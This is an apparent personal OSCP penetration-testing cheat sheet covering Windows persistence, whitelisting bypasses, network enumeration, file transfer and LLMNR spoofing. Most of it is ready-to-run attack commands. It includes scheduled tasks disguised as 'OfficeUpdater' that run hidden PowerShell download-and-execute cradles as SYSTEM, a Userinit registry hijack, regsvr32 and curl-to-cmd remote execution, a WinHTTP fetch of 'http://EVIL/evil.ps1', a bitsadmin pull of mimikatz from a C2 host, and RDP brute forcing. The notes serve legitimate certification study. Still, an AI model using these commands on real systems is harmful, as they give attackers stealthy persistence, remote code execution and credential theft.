# my OSCP_note




#Persistence

##### SCHTASKS


```	
	#On System Startup
	schtasks /create /TN OfficeUpdaterA /tr ""c:\evil32.exe" -k password -n services" /SC onstart /RU system /RL HIGHEST
	schtasks /create /TN OfficeUpdaterD /tr "\"c:\Program Files\evil32.exe\" -k password -n services" /SC onstart /RU system /RL HIGHEST
	
	#On User Login
	schtasks /create /TN OfficeUpdaterB /tr ""c:\evil32.exe" -k password -n services" /SC onlogon
	schtasks /create /TN OfficeUpdaterE /tr "\"c:\Program Files\evil32.exe\" -k password -n services" /SC onlogon	

	#On Idle
	schtasks /create /TN OfficeUpdaterC /tr ""c:\evil32.exe" -k password -n services" /SC onidle /i 30''''
	schtasks /create /TN OfficeUpdaterF /tr "\"c:\Program Files\evil32.exe\" -k password -n services" /SC onidle /i 60
```


#### Download & Execute (Persistence)

```
	#(X86) - On User Login
	schtasks /create /tn OfficeUpdaterA /tr "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring('''http://<ip address>/<uri>'''))'" /sc onlogon /ru System
 
	#(X86) - On System Start
	schtasks /create /tn OfficeUpdaterB /tr "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring('''http://<ip address>/<uri>'''))'" /sc onstart /ru System
 
	#(X86) - On User Idle (30mins)
	schtasks /create /tn OfficeUpdaterC /tr "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring('''http://<ip address>/<uri>'''))'" /sc onidle /i 30
 
	#(X64) - On User Login
	schtasks /create /tn OfficeUpdaterA /tr "c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring('''http://<ip address>/<uri>'''))'" /sc onlogon /ru System
 
	#(X64) - On System Start
	schtasks /create /tn OfficeUpdaterB /tr "c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring('''http://<ip address>/<uri>'''))'" /sc onstart /ru System
 
	#(X64) - On User Idle (30mins)
	schtasks /create /tn OfficeUpdaterC /tr "c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring('''http://192.168.95.195:8080/kBBldxiub6'''))'" /sc onidle /i 30
```


//Reestr

```	
	HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit
	HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit = (REG_SZ) C:\windows\system32\userinit.exe,c:\windows\badprogram.exe
```



##### Application Whitelisting Bypass Techniques

```

1. IEExec -This technique may work in certain environments.  Its relies on the fact that many organizations trust executables signed
by Microsoft.  We can misuse this trust by launching a specially crafted .NET application. 
Example Here: https://room362.com/post/2014/2014-01-16-application-whitelist-bypass-using-ieexec-dot-exe/

2.  Rundll32.exe

3.  ClickOnce Applications dfsvc.exe dfshim.dll

4.  XBAP - XML Browser Applications WPF PresentationHost.exe

5.  MD5 Hash Collision 
http://www.mathstat.dal.ca/~selinger/md5collision/

6.  PowerShell - Specifically Reflective Execution
http://clymb3r.wordpress.com/2013/04/06/reflective-dll-injection-with-powershell/
https://www.defcon.org/images/defcon-21/dc-21-presentations/Bialek/DEFCON-21-Bialek-PowerPwning-Post-Exploiting-by-Overpowering-Powershell.pdf

7. .HTA Application Invoke PowerShell Scripts
    Launched by mshta.exe, bypasses IE security settings as well.

8.  bat, vbs, ps1
    1. cmd.exe /k < script.txt
    2. cscript.exe //E:vbscript script.txt
    3. Get-Content script.txt | iex
    
9. Malicious Troubleshooting packs - MSDT.exe
    Reference: http://cybersyndicates.com/2015/10/a-no-bull-guide-to-malicious-windows-trouble-shooting-packs-and-application-whitelist-bypass/
    Thanks to @nberthaume, @Killswitch_GUI 
    
10. InstallUtil.exe
    A signed MS binary that loads assemblies and executes - One of the best.
    Examples here: https://gist.github.com/subTee

11. Regsvcs/Regasm
    See: https://gist.github.com/subTee/fb09ef511e592e6f7993
    These 2 are Excellent.

12. regsvr32.exe 
    https://gist.github.com/subTee/24c7d8e1ff0f5602092f58cbb3f7d302
    This one is just simply amazing... 
    regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll

13. Msbuild.exe
    http://subt0x10.blogspot.com/2016/09/bypassing-application-whitelisting.html
```

#### Startup Folders (Путь к папкам автозапуск)
```	
	#All Users - Windows XP
	C:\Documents and Settings\All Users\Start Menu\Programs\Startup

	#All Users - Windows Vista+
	C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup

	#User Profile - Windows XP
	C:\Documents and Settings\<USERNAME>\Start Menu\Programs\Startup

	#User Profile - Windows Vista+
	C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
```


#up my server

#### Linux

```

python -m SimpleHTTPServer 80

python3 -m http.server

ruby -r webrick -e "WEBrick::HTTPServer.new(:Port => 80, :DocumentRoot => Dir.pwd).start"

php -S 0.0.0.0:80

```

#### SharpView Enumeration

```bash
#https://github.com/tevora-threat/SharpView

Get-DomainFileServer
Get-DomainGPOUserLocalGroupMapping
Find-GPOLocation
Get-DomainGPOComputerLocalGroupMapping
Find-GPOComputerAdmin
Get-DomainObjectAcl
Get-ObjectAcl
Add-DomainObjectAcl
Add-ObjectAcl
Remove-DomainObjectAcl
Get-RegLoggedOn
Get-LoggedOnLocal
Get-NetRDPSession
Test-AdminAccess
Invoke-CheckLocalAdminAccess
Get-WMIProcess
Get-NetProcess
Get-WMIRegProxy
Get-Proxy
Get-WMIRegLastLoggedOn
Get-LastLoggedOn
Get-WMIRegCachedRDPConnection
Get-CachedRDPConnection
Get-WMIRegMountedDrive
Get-RegistryMountedDrive
Find-InterestingDomainAcl
Invoke-ACLScanner
Get-NetShare
Get-NetLoggedon
```

#### SMB Enumeration

```bash
nmap -p 139,445 --script smb.nse,smb-enum-shares,smbls
enum4linux 1.3.3.7
smbmap -H 1.3.3.7
smbclient -L \\INSERTIPADDRESS
smbclient -L INSERTIPADDRESS
smbclient //INSERTIPADDRESS/tmp
smbclient \\\\INSERTIPADDRESS\\ipc$ -U john
smbclient //INSERTIPADDRESS/ipc$ -U john
smbclient //INSERTIPADDRESS/admin$ -U john
nbtscan [SUBNET]


#Check for SMB Signing
nmap --script smb-security-mode.nse -p 445 10.10.14.14
```

#### SNMP Enumeration

```bash
snmpwalk -c public -v1 10.10.14.14
snmpcheck -t 10.10.14.14 -c public
onesixtyone -c names -i hosts
nmap -sT -p 161 10.10.14.14 -oG snmp_results.txt
snmpenum -t 10.10.14.14
```

#### MySQL Enumeration

```bash
nmap -sV -Pn -vv  10.0.0.1 -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122
```

#### DNS Zone Transfer

```bash
dig axfr blah.com @ns1.m0chan.com
nslookup -> set type=any -> ls -d m0chan.com
dnsrecon -d m0chan -D /usr/share/wordlists/dnsmap.txt -t std --xml ouput.xml
```

#### LDAP

```bash
ldapsearch -H ldap://<ip>
ldapwhoami
```

#### RPC Enumeration

```bash
rpcclient -U "10.10.14.14"
srvinfo
enumdomusers
enumalsgroups domain
lookupnames administrators
querydominfo
enumdomusers
queryuser <user>
lsaquery
lookupnames Guest
lookupnames Administrator
```

#### Remote Desktop

```bash
rdesktop -u guest -p guest INSERTIPADDRESS -g 94%

# Brute force
ncrack -vv --user Administrator -P /root/oscp/passwords.txt rdp://INSERTIPADDRESS
hydra
medusa
and so on
```

### File Transfer

#### TFTP

```bash
m0chan Machine
mkdir tftp
atftpd --deamon --port 69 tftp
cp *file* tftp
On victim machine:
tftp -i <[IP]> GET <[FILE]>
```

#### FTP

```bash
echo open <[IP]> 21 > ftp.txt
echo USER demo >> ftp.txt
echo ftp >> ftp.txt
echo bin >> ftp.txt
echo GET nc.exe >> ftp.txt
echo bye >> ftp.txt
ftp -v -n -s:ftp.txt
```

#### VBS Script

```bash
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET",strURL,False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile,True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs



cscript wget.vbs <url> <out_file>

Use echoup function on pentest.ws to generate echo commands.
https://pentest.ws/features
```

#### Powershell

```bash
#https://github.com/danielbohannon/Invoke-CradleCrafter Use this to craft obsufacted cradles

Invoke-WebRequest "https://server/filename" -OutFile "C:\Windows\Temp\filename"

(New-Object System.Net.WebClient).DownloadFile("https://server/filename", "C:\Windows\Temp\filename") 

#Powershell Download to Memory

IEX(New-Object Net.WebClient).downloadString('http://server/script.ps1')

#Powershell with Proxy

$browser = New-Object System.Net.WebClient;
$browser.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;
IEX($browser.DownloadString('https://server/script.ps1'));
```

#### Powershell Base64

```bash
$fileName = "Passwords.kdbx"
$fileContent = get-content $fileName
$fileContentBytes = [System.Text.Encoding]::UTF8.GetBytes($fileContent)
$fileContentEncoded = [System.Convert]::ToBase64String($fileContentBytes)
$fileContentEncoded | set-content ($fileName + ".b64")
```

#### Secure Copy / pscp.exe

```bash
pscp.exe C:\Users\Public\m0chan.txt user@target:/tmp/m0chan.txt
pscp.exe user@target:/home/user/m0chan.txt C:\Users\Public\m0chan.txt
```

#### BitsAdmin.exe

```bash
cmd.exe /c "bitsadmin.exe /transfer downld_job /download /priority high http://c2.m0chan.com C:\Temp\mimikatz.exe & start C:\Temp\binary.exe"
```

#### Remote Desktop

```bash
rdesktop 10.10.10.10 -r disk:linux='/home/user/filetransferout'
```

#### WinHTTP Com Object

```bash
$h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open('GET','http://EVIL/evil.ps1',$false);$h.send();iex $h.responseText
```

#### CertUtil

```bash
#File Transfer

certutil.exe -urlcache -split -f https://m0chan:8888/filename outputfilename
```

#### CertUtil Base64 Transfers

```bash
certutil.exe -encode inputFileName encodedOutputFileName
certutil.exe -decode encodedInputFileName decodedOutputFileName
```

#### Curl \(Windows 1803+\)

```text
curl http://server/file -o file
curl http://server/file.bat | cmd

IEX(curl http://server/script.ps1);Invoke-xxx
```

#### SMB

```bash
python smbserver.py Share `pwd` -u m0chan -p m0chan --smb-2support
Exploit
```

### Exploit

#### LLMNR / NBT-NS Spoofing

```bash
git clone https://github.com/SpiderLabs/Responder.git python Responder.py -i local-ip -I eth0
```

![-w1673](https://cdn.nlark.com/yuque/0/2019/jpeg/370919/1570366728253-f76d3f21-19d8-475c-84e0-1ccfadf599b3.jpeg)￼

#### Responder WPAD Attack

```bash
responder -I eth0 wpad
```
